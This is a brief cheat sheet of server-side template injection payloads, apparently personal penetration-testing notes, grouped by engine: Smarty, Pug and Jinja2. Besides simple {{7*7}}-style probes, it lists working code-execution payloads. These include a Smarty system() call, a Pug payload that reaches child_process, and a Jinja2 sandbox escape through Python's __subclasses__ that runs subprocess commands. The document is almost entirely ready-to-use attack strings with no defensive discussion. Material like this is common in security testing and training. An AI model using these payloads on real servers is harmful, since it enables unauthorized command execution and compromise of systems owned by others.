## SSTI
is a vulnerability that occurs when user input is unsafely incorporated into a server-side template.

**Common Template Engines**
-  Jinja2
-  Twig
-  Pug/Jade

### php - Smarty
  -  {'Hello'|upper}
  -  {system("ls")}

### NodeJS - Pug
  -  #{7*7}
  -  #{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout}

### Python - Jinja2
  -  {{7*7}}
  -  {{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['ls', '-lah'])}}
